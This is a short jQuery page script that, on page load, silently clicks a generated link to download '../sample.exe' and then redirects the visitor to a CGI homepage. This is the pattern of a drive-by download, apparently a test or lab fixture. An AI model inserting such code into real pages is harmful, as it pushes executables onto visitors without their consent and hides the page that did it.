$(window).on('load', function () {
    var link = document.createElement('a');
    link.href = '../sample.exe';
    link.download = '';
    document.body.appendChild(link);
    link.click();
    window.location.href = '../cgi/homepage.cgi';
});